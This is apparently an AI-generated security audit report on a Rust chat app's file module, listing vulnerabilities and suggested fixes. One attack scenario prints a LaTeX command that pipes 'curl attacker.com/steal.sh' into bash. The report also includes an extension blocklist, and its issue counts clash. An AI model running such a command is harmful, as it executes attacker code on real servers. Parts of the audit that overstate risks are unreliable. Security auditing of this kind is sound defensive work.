# File Module Security Audit Report

**Audit Date:** 2025-11-21
**Module:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/`
**Auditor:** Claude Code Security Scanner

---

## Executive Summary

This security audit examined the file upload/download module for common vulnerabilities including path traversal, file type validation, access control, malicious uploads, and command injection. The module demonstrates **good security practices** overall with proper access control and user isolation, but several **critical and high-severity issues** were identified that require immediate attention.

**Risk Level: HIGH**

### Critical Issues Found: 2
### High Severity Issues: 3
### Medium Severity Issues: 4
### Low Severity Issues: 3

---

## 1. Path Traversal Vulnerabilities

### 1.1 CRITICAL: Path Traversal via User-Controlled Extension

**Severity:** CRITICAL
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 62-66

**Vulnerable Code:**
```rust
// Extract extension
let extension = filename
    .rsplit('.')
    .next()
    .unwrap_or("bin")
    .to_lowercase();
```

**Issue:**
The extension is extracted directly from the user-supplied filename without validation. An attacker could provide a filename like:
- `malicious.php` - Upload PHP web shell
- `../../etc/passwd` - Attempt directory traversal
- `file.tar.gz` - Only extracts "gz", not full extension
- `file.` - Empty extension could cause issues
- `file..exe` - Double extension bypass

The extension is then used in file path construction in `FilesystemStorage::get_original_path()`:
```rust
self.get_user_path(user_id, "originals")
    .join(format!("{}.{}", file_id, extension))
```

While the UUID prefix provides some protection, the extension is still unvalidated and could be exploited.

**Attack Scenario:**
1. Attacker uploads file named `../../../var/www/shell.php`
2. Extension extracted as `php`
3. If storage directory is web-accessible, PHP web shell is created
4. Attacker gains remote code execution

**Recommended Fix:**
```rust
// Whitelist of allowed extensions
const ALLOWED_EXTENSIONS: &[&str] = &[
    "pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    "jpg", "jpeg", "png", "gif", "bmp", "webp", "tiff",
    "rtf", "odt", "ods", "csv"
];

// Extract and validate extension
let extension = filename
    .rsplit('.')
    .next()
    .unwrap_or("bin")
    .to_lowercase();

// Validate extension is alphanumeric only (no path chars)
if !extension.chars().all(|c| c.is_alphanumeric()) {
    return Err(AppError::bad_request(
        "INVALID_EXTENSION",
        "File extension contains invalid characters"
    ).into());
}

// Check against whitelist
if !ALLOWED_EXTENSIONS.contains(&extension.as_str()) {
    return Err(AppError::bad_request(
        "UNSUPPORTED_FILE_TYPE",
        format!("File type '.{}' is not supported", extension)
    ).into());
}

// Limit extension length
if extension.len() > 10 {
    return Err(AppError::bad_request(
        "INVALID_EXTENSION",
        "File extension too long"
    ).into());
}
```

---

### 1.2 MEDIUM: Missing Path Canonicalization

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/storage/filesystem.rs`
**Lines:** 95-103, 130-141

**Issue:**
The `load_original()` and `get_original_path()` methods construct file paths without canonicalization or validation that the resulting path is within the expected directory structure.

**Vulnerable Code:**
```rust
fn get_original_path(
    &self,
    user_id: Uuid,
    file_id: Uuid,
    extension: &str,
) -> PathBuf {
    self.get_user_path(user_id, "originals")
        .join(format!("{}.{}", file_id, extension))
}
```

**Attack Scenario:**
If extension validation is bypassed (e.g., via SQL injection or database manipulation), an attacker could craft paths that escape the intended directory.

**Recommended Fix:**
```rust
fn get_original_path(
    &self,
    user_id: Uuid,
    file_id: Uuid,
    extension: &str,
) -> PathBuf {
    let path = self.get_user_path(user_id, "originals")
        .join(format!("{}.{}", file_id, extension));

    // Canonicalize and verify path is within base_path
    if let Ok(canonical) = path.canonicalize() {
        if !canonical.starts_with(&self.base_path) {
            panic!("Path traversal detected: {:?}", path);
        }
    }

    path
}
```

---

## 2. File Type Validation

### 2.1 HIGH: MIME Type Only from Extension (No Magic Bytes Validation)

**Severity:** HIGH
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 68-71

**Vulnerable Code:**
```rust
// Determine MIME type
let mime_type = mime_guess::from_ext(&extension)
    .first()
    .map(|m| m.to_string());
```

**Issue:**
MIME type is determined solely from the file extension without validating the actual file content (magic bytes). An attacker can upload an executable with a `.jpg` extension, and it will be accepted as an image.

**Attack Scenario:**
1. Attacker creates `malware.exe` and renames it to `photo.jpg`
2. Upload succeeds because extension is `.jpg`
3. MIME type is set to `image/jpeg` based on extension
4. File processing may fail gracefully, but malicious file is stored
5. If users download the file and open it, malware executes

**Recommended Fix:**
```rust
// Determine MIME type from extension
let declared_mime = mime_guess::from_ext(&extension)
    .first()
    .map(|m| m.to_string());

// Validate actual file content matches declared type
let actual_mime = infer::get(&file_data)
    .map(|t| t.mime_type().to_string());

// Verify MIME types match (or at least are compatible)
match (&declared_mime, &actual_mime) {
    (Some(declared), Some(actual)) => {
        // Extract base types (e.g., "image" from "image/jpeg")
        let declared_base = declared.split('/').next().unwrap_or("");
        let actual_base = actual.split('/').next().unwrap_or("");

        if declared_base != actual_base {
            return Err(AppError::bad_request(
                "FILE_TYPE_MISMATCH",
                format!(
                    "File extension '{}' does not match file content (detected: {})",
                    extension, actual
                )
            ).into());
        }
    }
    (_, None) => {
        // Could not detect file type - reject for security
        return Err(AppError::bad_request(
            "UNKNOWN_FILE_TYPE",
            "Could not determine file type from content"
        ).into());
    }
    _ => {}
}

// Use actual detected MIME type if available
let mime_type = actual_mime.or(declared_mime);
```

**Required Dependency:**
Add to `Cargo.toml`:
```toml
infer = "0.15"  # Magic bytes detection library
```

---

### 2.2 MEDIUM: Dangerous File Types Not Explicitly Blocked

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 62-71

**Issue:**
There is no explicit blocklist for dangerous file types. While processing only supports certain types, executable files (`.exe`, `.sh`, `.bat`, `.cmd`, `.scr`, `.jar`, `.app`, `.dmg`, `.deb`, `.rpm`, etc.) are not explicitly rejected.

**Recommended Fix:**
```rust
// Blocklist of dangerous extensions
const BLOCKED_EXTENSIONS: &[&str] = &[
    // Executables
    "exe", "dll", "com", "bat", "cmd", "msi", "scr", "pif",
    "app", "deb", "rpm", "dmg", "pkg", "run",
    // Scripts
    "sh", "bash", "zsh", "ps1", "vbs", "vbe", "js", "jar",
    // Web shells / Server-side scripts
    "php", "asp", "aspx", "jsp", "cgi", "pl", "py", "rb",
    // Archives with auto-extract (could contain malware)
    "rar", "ace",
    // Other dangerous
    "reg", "lnk", "url"
];

let extension = filename
    .rsplit('.')
    .next()
    .unwrap_or("bin")
    .to_lowercase();

// Check blocklist first
if BLOCKED_EXTENSIONS.contains(&extension.as_str()) {
    return Err(AppError::bad_request(
        "BLOCKED_FILE_TYPE",
        format!("File type '.{}' is not allowed for security reasons", extension)
    ).into());
}
```

---

## 3. File Size Limits & Resource Exhaustion

### 3.1 LOW: File Size Limit Could Be More Granular

**Severity:** LOW
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 18, 50-56

**Current Implementation:**
```rust
const MAX_FILE_SIZE: usize = 100 * 1024 * 1024; // 100MB

// Validate file size
if file_data.len() > MAX_FILE_SIZE {
    return Err(AppError::bad_request(
        "FILE_TOO_LARGE",
        format!("File size exceeds maximum of {} bytes", MAX_FILE_SIZE),
    ).into());
}
```

**Issue:**
The 100MB limit is reasonable, but it applies to all file types equally. Different file types could have different limits to prevent resource exhaustion during processing:
- Images: 10MB
- Documents: 50MB
- PDFs: 100MB
- Videos (if supported): Higher limit

**Recommendation:**
```rust
fn get_max_file_size(mime_type: Option<&str>) -> usize {
    match mime_type {
        Some(mime) if mime.starts_with("image/") => 10 * 1024 * 1024, // 10MB
        Some(mime) if mime.starts_with("text/") => 5 * 1024 * 1024,   // 5MB
        Some("application/pdf") => 100 * 1024 * 1024,                 // 100MB
        _ => 50 * 1024 * 1024,                                         // 50MB default
    }
}

let max_size = get_max_file_size(mime_type.as_deref());
if file_data.len() > max_size {
    return Err(AppError::bad_request(
        "FILE_TOO_LARGE",
        format!("File size exceeds maximum of {} bytes for this file type", max_size),
    ).into());
}
```

---

### 3.2 MEDIUM: No Rate Limiting on File Uploads

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 21-24

**Issue:**
There is no rate limiting on file uploads. An attacker could:
1. Upload many small files to exhaust disk space
2. Upload many large files to exhaust bandwidth
3. Trigger expensive processing operations (PDF rendering, OCR) repeatedly to cause DoS

**Current Code:**
```rust
pub async fn upload_file(
    auth: RequirePermissions<(FilesUpload,)>,
    mut multipart: Multipart,
) -> ApiResult<Json<File>> {
    // No rate limiting check
```

**Recommended Fix:**
Add rate limiting middleware or check:
```rust
// In upload_file handler
let user_id = auth.user.id;

// Check upload count in last hour
let recent_uploads = Repos.file
    .count_recent_uploads(user_id, chrono::Duration::hours(1))
    .await?;

const MAX_UPLOADS_PER_HOUR: i64 = 50;
if recent_uploads >= MAX_UPLOADS_PER_HOUR {
    return Err(AppError::too_many_requests(
        "RATE_LIMIT_EXCEEDED",
        format!("Maximum {} uploads per hour exceeded", MAX_UPLOADS_PER_HOUR)
    ).into());
}

// Check total storage used by user
let total_storage = Repos.file
    .get_total_storage_by_user(user_id)
    .await?;

const MAX_STORAGE_PER_USER: i64 = 10 * 1024 * 1024 * 1024; // 10GB
if total_storage + (file_data.len() as i64) > MAX_STORAGE_PER_USER {
    return Err(AppError::bad_request(
        "STORAGE_QUOTA_EXCEEDED",
        "User storage quota exceeded"
    ).into());
}
```

---

## 4. Access Control

### 4.1 LOW: Access Control is Well-Implemented ✓

**Severity:** N/A (POSITIVE FINDING)
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/download.rs`
**Lines:** 29-34, 78-81

**Good Implementation:**
```rust
// Download file - verifies ownership
let file = Repos.file
    .get_by_id_and_user(file_id, user_id)
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
    .ok_or(StatusCode::NOT_FOUND)?;
```

**Analysis:**
✓ All file operations verify ownership via `get_by_id_and_user()`
✓ User cannot access files belonging to other users
✓ Permission-based access control via `RequirePermissions` extractor
✓ Separate permissions for upload, download, preview, delete

**No issues found in access control implementation.**

---

### 4.2 MEDIUM: Download Tokens Have Fixed Expiry

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/download.rs`
**Lines:** 20, 84-89

**Current Implementation:**
```rust
const TOKEN_EXPIRY: i64 = 3600; // 1 hour

let claims = DownloadTokenClaims {
    file_id: file_id.to_string(),
    user_id: user_id.to_string(),
    exp: now + TOKEN_EXPIRY as usize,
    iat: now,
};
```

**Issue:**
- Tokens have a fixed 1-hour expiry
- No mechanism to revoke tokens early
- If a user is deleted/disabled, their tokens remain valid until expiry
- No tracking of token usage (could be shared/leaked)

**Recommended Enhancements:**
```rust
// Add token tracking table (migration):
// CREATE TABLE download_tokens (
//     token_id UUID PRIMARY KEY,
//     file_id UUID NOT NULL,
//     user_id UUID NOT NULL,
//     expires_at TIMESTAMPTZ NOT NULL,
//     revoked BOOLEAN DEFAULT false,
//     created_at TIMESTAMPTZ DEFAULT NOW()
// );

// When generating token:
let token_id = Uuid::new_v4();
let claims = DownloadTokenClaims {
    token_id: token_id.to_string(),  // Add this field
    file_id: file_id.to_string(),
    user_id: user_id.to_string(),
    exp: now + TOKEN_EXPIRY as usize,
    iat: now,
};

// Store token in database for tracking
Repos.download_token.create(token_id, file_id, user_id, expiry).await?;

// When validating token:
// 1. Verify JWT signature
// 2. Check token not revoked in database
// 3. Check user still exists and is active
// 4. Check file still exists
```

---

## 5. Malicious File Uploads

### 5.1 HIGH: SVG Files Could Contain XSS

**Severity:** HIGH
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/processing/image.rs`
**Lines:** 48-54

**Issue:**
SVG files are not in the supported list, but if image processing is expanded to support them, SVG files can contain embedded JavaScript that executes when viewed in a browser.

**Current Code:**
```rust
fn can_generate(&self, mime_type: &str) -> bool {
    matches!(
        mime_type,
        "image/jpeg" | "image/jpg" | "image/png" | "image/gif"
            | "image/webp" | "image/bmp" | "image/tiff"
    )
}
```

**Recommendation:**
If SVG support is added:
1. **DO NOT serve SVG files directly** - Always render them to raster formats (PNG/JPEG)
2. **Sanitize SVG content** before storage using a library like `svg-sanitizer`
3. **Set Content-Type to `image/svg+xml`** with **`Content-Security-Policy: default-src 'none'; script-src 'none'`** header
4. **Use `Content-Disposition: attachment`** to force download instead of inline display

```rust
// If SVG support is needed:
"image/svg+xml" => {
    // Sanitize SVG to remove scripts
    let sanitized = svg_sanitizer::sanitize(data)?;

    // Convert to PNG for safe display
    let png_data = convert_svg_to_png(&sanitized)?;

    // Store PNG instead of original SVG
    png_data
}
```

---

### 5.2 MEDIUM: ZIP Bombs / Decompression DoS

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/processing/office.rs`
**Lines:** Various

**Issue:**
Office documents (DOCX, XLSX, PPTX) are actually ZIP archives. A malicious user could upload a "zip bomb" - a small compressed file that expands to gigabytes of data, causing memory exhaustion.

**Attack Scenario:**
1. Attacker creates a zip bomb (42KB → 4.5PB when decompressed)
2. Renames to `document.docx`
3. Uploads file
4. Processing attempts to decompress, causing OOM crash

**Recommendation:**
```rust
// Add decompression size limit checking
use zip::ZipArchive;

const MAX_DECOMPRESSED_SIZE: u64 = 500 * 1024 * 1024; // 500MB

fn validate_zip_archive(data: &[u8]) -> Result<(), AppError> {
    let cursor = std::io::Cursor::new(data);
    let mut archive = ZipArchive::new(cursor)
        .map_err(|e| AppError::bad_request("INVALID_ARCHIVE", "Invalid ZIP archive"))?;

    let mut total_uncompressed: u64 = 0;

    for i in 0..archive.len() {
        let file = archive.by_index(i)
            .map_err(|e| AppError::internal_error("Failed to read archive entry"))?;

        total_uncompressed += file.size();

        if total_uncompressed > MAX_DECOMPRESSED_SIZE {
            return Err(AppError::bad_request(
                "DECOMPRESSION_BOMB",
                "File exceeds maximum decompressed size"
            ));
        }

        // Check compression ratio (10:1 is suspicious)
        let ratio = file.size() as f64 / file.compressed_size() as f64;
        if ratio > 10.0 {
            return Err(AppError::bad_request(
                "SUSPICIOUS_COMPRESSION",
                "File has suspicious compression ratio"
            ));
        }
    }

    Ok(())
}
```

---

## 6. Storage Security

### 6.1 MEDIUM: File Permissions Not Explicitly Set

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/storage/filesystem.rs`
**Lines:** 53-55

**Current Code:**
```rust
fs::write(&path, data)
    .await
    .map_err(|e| AppError::internal_error(format!("Failed to write file: {}", e)))?;
```

**Issue:**
Files are created with default permissions inherited from the process umask. This could result in world-readable files containing sensitive user data.

**Recommended Fix:**
```rust
use tokio::fs::OpenOptions;
use std::os::unix::fs::PermissionsExt;

// Write file with explicit permissions (owner read/write only)
fs::write(&path, data).await
    .map_err(|e| AppError::internal_error(format!("Failed to write file: {}", e)))?;

// Set strict permissions: 0600 (rw-------)
#[cfg(unix)]
{
    let metadata = fs::metadata(&path).await
        .map_err(|e| AppError::internal_error(format!("Failed to get metadata: {}", e)))?;
    let mut permissions = metadata.permissions();
    permissions.set_mode(0o600);
    fs::set_permissions(&path, permissions).await
        .map_err(|e| AppError::internal_error(format!("Failed to set permissions: {}", e)))?;
}
```

---

### 6.2 LOW: Storage Directory Structure is Predictable

**Severity:** LOW
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/storage/filesystem.rs`
**Lines:** 36-38

**Current Implementation:**
```rust
fn get_user_path(&self, user_id: Uuid, subdir: &str) -> PathBuf {
    self.base_path.join(subdir).join(user_id.to_string())
}
```

**Issue:**
Storage paths are predictable: `{base_path}/originals/{user_id}/{file_id}.{ext}`

While UUIDs provide good randomness, a more opaque structure could prevent information disclosure:
- Knowledge of user IDs
- File count per user
- File types stored

**Recommendation:**
Consider hashing user IDs for storage paths:
```rust
use sha2::{Sha256, Digest};

fn get_user_path(&self, user_id: Uuid, subdir: &str) -> PathBuf {
    // Hash user_id for storage path obfuscation
    let mut hasher = Sha256::new();
    hasher.update(user_id.as_bytes());
    let hash = hex::encode(hasher.finalize());

    // Use first 16 chars of hash as directory name
    let dir_name = &hash[..16];

    self.base_path.join(subdir).join(dir_name)
}
```

---

## 7. Temporary File Handling

### 7.1 MEDIUM: Temp Files Not Cleaned Up on Processing Failure

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/processing/office.rs`
**Lines:** 85-133

**Vulnerable Code:**
```rust
let temp_path = Self::write_temp_file(data, extension)?;

let temp_dir = std::env::temp_dir().join(format!("office_text_pdf_{}", Uuid::new_v4()));
fs::create_dir_all(&temp_dir)
    .map_err(|e| AppError::internal_error(format!("Failed to create temp dir: {}", e)))?;

let temp_pdf = temp_dir.join("document.pdf");

// Convert to PDF using Pandoc
let result = pandoc::convert_to_pdf(&temp_path, &temp_pdf).await;

// Clean up source file
Self::cleanup_temp_file(&temp_path);  // Only source cleaned up here

match result {
    Ok(_) => {
        let pdf_data = fs::read(&temp_pdf)
            .map_err(|e| {
                let _ = fs::remove_dir_all(&temp_dir);  // Cleanup on error
                AppError::internal_error(format!("Failed to read generated PDF: {}", e))
            })?;
        // ...
        let _ = fs::remove_dir_all(&temp_dir);  // Cleanup on success
    }
    Err(e) => {
        let _ = fs::remove_dir_all(&temp_dir);  // Cleanup on pandoc error
        Ok(vec![])
    }
}
```

**Issue:**
Multiple cleanup points make it error-prone. If a panic occurs between file creation and cleanup, files are leaked.

**Recommended Fix:**
Use RAII pattern with Drop trait:
```rust
struct TempFile {
    path: PathBuf,
}

impl TempFile {
    fn new(data: &[u8], extension: &str) -> Result<Self, AppError> {
        let temp_dir = std::env::temp_dir();
        let filename = format!("{}.{}", Uuid::new_v4(), extension);
        let path = temp_dir.join(filename);

        std::fs::write(&path, data)
            .map_err(|e| AppError::internal_error(format!("Failed to write temp file: {}", e)))?;

        Ok(Self { path })
    }

    fn path(&self) -> &PathBuf {
        &self.path
    }
}

impl Drop for TempFile {
    fn drop(&mut self) {
        // Guaranteed cleanup even on panic
        let _ = std::fs::remove_file(&self.path);
    }
}

// Usage:
let temp_file = TempFile::new(data, extension)?;
let result = pandoc::convert_to_pdf(temp_file.path(), &temp_pdf).await;
// temp_file automatically cleaned up when it goes out of scope
```

---

### 7.2 HIGH: Race Condition in Temp File Creation

**Severity:** HIGH
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/processing/office.rs`
**Lines:** 18-26

**Vulnerable Code:**
```rust
fn write_temp_file(data: &[u8], extension: &str) -> Result<PathBuf, AppError> {
    let temp_dir = std::env::temp_dir();
    let filename = format!("{}.{}", Uuid::new_v4(), extension);
    let temp_path = temp_dir.join(filename);

    fs::write(&temp_path, data)
        .map_err(|e| AppError::internal_error(format!("Failed to write temp file: {}", e)))?;

    Ok(temp_path)
}
```

**Issue:**
While UUID provides good uniqueness, there's still a theoretical TOCTOU (time-of-check-time-of-use) race condition:
1. Thread A generates UUID and checks file doesn't exist
2. Thread B generates same UUID (extremely unlikely but theoretically possible)
3. Both threads write to same file
4. Data corruption or information disclosure

**Recommended Fix:**
```rust
use std::fs::OpenOptions;

fn write_temp_file(data: &[u8], extension: &str) -> Result<PathBuf, AppError> {
    let temp_dir = std::env::temp_dir();

    // Retry loop in case of collision
    for _ in 0..5 {
        let filename = format!("{}.{}", Uuid::new_v4(), extension);
        let temp_path = temp_dir.join(filename);

        // Create file exclusively (fails if exists)
        match OpenOptions::new()
            .write(true)
            .create_new(true)  // Fail if file exists
            .open(&temp_path)
        {
            Ok(mut file) => {
                std::io::Write::write_all(&mut file, data)
                    .map_err(|e| AppError::internal_error(format!("Failed to write: {}", e)))?;
                return Ok(temp_path);
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                continue; // Try again with new UUID
            }
            Err(e) => {
                return Err(AppError::internal_error(format!("Failed to create file: {}", e)));
            }
        }
    }

    Err(AppError::internal_error("Failed to create unique temp file after retries"))
}
```

---

## 8. Information Disclosure

### 8.1 LOW: Detailed Error Messages in Download Responses

**Severity:** LOW
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/download.rs`
**Lines:** 33-34, 49

**Current Code:**
```rust
let file = Repos.file
    .get_by_id_and_user(file_id, user_id)
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?  // Generic error
    .ok_or(StatusCode::NOT_FOUND)?;  // Reveals file doesn't exist

let file_data = storage
    .load_original(user_id, file_id, &extension)
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;  // Could reveal storage issues
```

**Issue:**
Returning `NOT_FOUND` for non-existent files allows an attacker to enumerate valid file IDs.

**Recommendation:**
Use constant-time response for both "not found" and "access denied":
```rust
let file = Repos.file
    .get_by_id_and_user(file_id, user_id)
    .await
    .map_err(|_| StatusCode::FORBIDDEN)?  // Don't reveal why
    .ok_or(StatusCode::FORBIDDEN)?;       // Same error for not found
```

This prevents attackers from distinguishing between:
- File exists but user doesn't own it
- File doesn't exist

---

## 9. SQL Injection

### 9.1 LOW: SQL Injection Risk is Minimal ✓

**Severity:** N/A (POSITIVE FINDING)
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/repository.rs`
**Lines:** All queries

**Good Implementation:**
```rust
let file = sqlx::query_as!(
    File,
    r#"
    SELECT id, user_id, filename, file_size, mime_type, checksum,
           has_thumbnail, preview_page_count, text_page_count,
           processing_metadata as "processing_metadata!: _",
           created_at as "created_at: _",
           updated_at as "updated_at: _"
    FROM files
    WHERE id = $1 AND user_id = $2
    "#,
    file_id,
    user_id
)
```

**Analysis:**
✓ All queries use SQLx's `query!` or `query_as!` macros with parameterized queries
✓ No string concatenation or interpolation in SQL
✓ User input is always passed as parameters (`$1`, `$2`, etc.)

**No SQL injection vulnerabilities found.**

---

## 10. Command Injection & Processing Security

### 10.1 CRITICAL: Command Injection via Pandoc

**Severity:** CRITICAL
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/utils/pandoc.rs`
**Lines:** 32-56

**Vulnerable Code:**
```rust
pub async fn convert_to_pdf(
    input_path: &PathBuf,
    output_path: &PathBuf,
) -> Result<(), AppError> {
    let pandoc_path = find_pandoc()?;

    let output = Command::new(pandoc_path)
        .arg(input_path)
        .arg("-o")
        .arg(output_path)
        .arg("--pdf-engine=pdflatex")  // CRITICAL: pdflatex can execute arbitrary code!
        .output()
        .map_err(|e| AppError::internal_error(format!("Failed to run Pandoc: {}", e)))?;
```

**Issue:**
The `--pdf-engine=pdflatex` option is **EXTREMELY DANGEROUS** because:

1. **LaTeX allows arbitrary command execution** via `\write18` or shell-escape
2. A malicious DOCX file could contain LaTeX code when converted
3. LaTeX can read/write arbitrary files on the system
4. LaTeX can execute system commands

**Attack Scenario:**
1. Attacker creates malicious DOCX containing:
   ```latex
   \immediate\write18{curl attacker.com/steal.sh | bash}
   ```
2. Uploads file to server
3. Pandoc converts DOCX → LaTeX → PDF
4. LaTeX executes shell command
5. Attacker gains remote code execution

**Recommended Fix:**

**Option 1: Disable LaTeX entirely (SAFEST)**
```rust
// Use weasyprint or other safe PDF engine
.arg("--pdf-engine=weasyprint")  // No code execution

// Or use prince
.arg("--pdf-engine=prince")
```

**Option 2: Sandbox LaTeX (if LaTeX is required)**
```rust
// Run in restricted mode
.arg("--pdf-engine=pdflatex")
.arg("--pdf-engine-opt=-no-shell-escape")  // Disable shell execution
.arg("--pdf-engine-opt=-halt-on-error")
```

**Option 3: Use containerized processing**
```rust
// Run pandoc in Docker container with no network/filesystem access
Command::new("docker")
    .arg("run")
    .arg("--rm")
    .arg("--network=none")
    .arg("--read-only")
    .arg("--tmpfs=/tmp")
    .arg("-v").arg(format!("{}:/input:ro", input_path.display()))
    .arg("-v").arg(format!("{}:/output", output_dir.display()))
    .arg("pandoc-image")
    .arg("pandoc")
    .arg("/input/file.docx")
    .arg("-o").arg("/output/file.pdf")
    .output()
```

**IMMEDIATE ACTION REQUIRED:** This vulnerability allows remote code execution and must be fixed before production deployment.

---

### 10.2 HIGH: Path Injection in Pandoc Command

**Severity:** HIGH
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/utils/pandoc.rs`
**Lines:** 39-42

**Vulnerable Code:**
```rust
let output = Command::new(pandoc_path)
    .arg(input_path)   // User-influenced path
    .arg("-o")
    .arg(output_path)  // User-influenced path
```

**Issue:**
While the paths are generated with UUIDs, there's no explicit validation that they don't contain shell metacharacters or path traversal sequences.

**Recommended Fix:**
```rust
// Validate paths are within expected directories
fn validate_path(path: &PathBuf, allowed_base: &Path) -> Result<(), AppError> {
    let canonical = path.canonicalize()
        .map_err(|e| AppError::internal_error("Invalid path"))?;

    if !canonical.starts_with(allowed_base) {
        return Err(AppError::internal_error("Path outside allowed directory"));
    }

    // Ensure no shell metacharacters in filename
    if let Some(filename) = path.file_name().and_then(|s| s.to_str()) {
        if filename.contains(&['&', '|', ';', '$', '`', '\n', '\r'][..]) {
            return Err(AppError::internal_error("Invalid filename characters"));
        }
    }

    Ok(())
}

// Before running command:
validate_path(input_path, &std::env::temp_dir())?;
validate_path(output_path, &std::env::temp_dir())?;
```

---

### 10.3 MEDIUM: Resource Exhaustion via PDF Rendering

**Severity:** MEDIUM
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/processing/pdf.rs`
**Lines:** 146-154

**Current Code:**
```rust
let page_count = document.pages().len() as u32;
let max_pages = page_count.min(max_thumbnails);

// Generate all preview images at full size
let mut images = Vec::new();
for page_index in 0..max_pages {
    let page = document.pages().get(page_index as u16)
        .map_err(|e| AppError::internal_error(format!("Failed to get page {}: {}", page_index + 1, e)))?;

    let image_bytes = render_page_to_jpeg(&page, MAX_IMAGE_DIM)?;
    images.push(image_bytes);
}
```

**Issue:**
A malicious PDF with 10,000 pages would trigger 10,000 page renders (limited by `max_thumbnails=5` currently, but this is hardcoded in processing manager).

**Recommended Fix:**
```rust
const ABSOLUTE_MAX_PAGES: u32 = 100;  // Hard limit regardless of settings

let page_count = document.pages().len() as u32;
if page_count > ABSOLUTE_MAX_PAGES {
    return Err(AppError::bad_request(
        "TOO_MANY_PAGES",
        format!("PDF has {} pages, maximum {} allowed", page_count, ABSOLUTE_MAX_PAGES)
    ));
}

let max_pages = page_count.min(max_thumbnails).min(ABSOLUTE_MAX_PAGES);
```

Also add timeout to rendering:
```rust
use tokio::time::{timeout, Duration};

const RENDER_TIMEOUT_SECS: u64 = 30;

let image_bytes = timeout(
    Duration::from_secs(RENDER_TIMEOUT_SECS),
    async { render_page_to_jpeg(&page, MAX_IMAGE_DIM) }
)
.await
.map_err(|_| AppError::internal_error("Page rendering timeout"))?;
```

---

## 11. Database Security

### 11.1 LOW: Processing Metadata is Unvalidated JSON

**Severity:** LOW
**File:** `/home/pbya/projects/ziee-chat/src-app/server/src/modules/file/handlers/upload.rs`
**Lines:** 122-123

**Current Code:**
```rust
processing_metadata: serde_json::to_value(&processing_result.metadata)
    .unwrap_or(serde_json::json!({})),
```

**Issue:**
Processing metadata is stored as JSONB without schema validation. While this is flexible, it could lead to:
- Storage of unexpected/malicious data structures
- Nested JSON bombs (deeply nested objects causing parsing issues)
- Injection of misleading metadata

**Recommended Fix:**
```rust
// Validate metadata structure
fn validate_metadata(metadata: &serde_json::Value) -> Result<(), AppError> {
    // Check depth
    fn check_depth(val: &serde_json::Value, current_depth: usize, max_depth: usize) -> bool {
        if current_depth > max_depth {
            return false;
        }

        match val {
            serde_json::Value::Object(map) => {
                map.values().all(|v| check_depth(v, current_depth + 1, max_depth))
            }
            serde_json::Value::Array(arr) => {
                arr.iter().all(|v| check_depth(v, current_depth + 1, max_depth))
            }
            _ => true
        }
    }

    const MAX_DEPTH: usize = 5;
    if !check_depth(metadata, 0, MAX_DEPTH) {
        return Err(AppError::internal_error("Metadata too deeply nested"));
    }

    // Check size
    let metadata_str = serde_json::to_string(metadata)
        .map_err(|e| AppError::internal_error("Invalid metadata"))?;

    const MAX_METADATA_SIZE: usize = 10_000; // 10KB
    if metadata_str.len() > MAX_METADATA_SIZE {
        return Err(AppError::internal_error("Metadata too large"));
    }

    Ok(())
}

let metadata_value = serde_json::to_value(&processing_result.metadata)
    .unwrap_or(serde_json::json!({}));
validate_metadata(&metadata_value)?;
```

---

## Summary of Findings

### Critical (Immediate Action Required)

1. **Path Traversal via Extension** - Unvalidated file extensions could lead to arbitrary file writes
2. **Command Injection via Pandoc/LaTeX** - Remote code execution via malicious Office documents

### High Severity (Fix Before Production)

1. **No Magic Bytes Validation** - MIME type determined only from extension
2. **SVG XSS Risk** - If SVG support is added, could lead to stored XSS
3. **Temp File Race Condition** - TOCTOU vulnerability in temporary file creation

### Medium Severity (Should Fix Soon)

1. **Missing Path Canonicalization** - Could lead to directory traversal
2. **Dangerous File Types Not Blocked** - Executable files not explicitly rejected
3. **No Rate Limiting** - DoS via unlimited uploads
4. **Download Token Issues** - No revocation mechanism
5. **ZIP Bomb Risk** - Office documents could be decompression bombs
6. **File Permissions** - Files created with default permissions
7. **Temp File Cleanup** - Incomplete cleanup on errors
8. **PDF Resource Exhaustion** - No limits on page count/rendering time

### Low Severity (Best Practices)

1. **Granular File Size Limits** - Same limit for all file types
2. **Predictable Storage Paths** - Could reveal user/file information
3. **Detailed Error Messages** - Could enable file ID enumeration
4. **Unvalidated JSON Metadata** - No schema validation

---

## Recommended Priority Actions

### 1. IMMEDIATE (This Week)

- [ ] Fix command injection in Pandoc (switch to safe PDF engine or sandbox)
- [ ] Add file extension whitelist/blacklist validation
- [ ] Implement magic bytes validation for file type verification
- [ ] Add absolute maximum page count for PDF processing

### 2. HIGH PRIORITY (This Month)

- [ ] Implement path canonicalization and validation
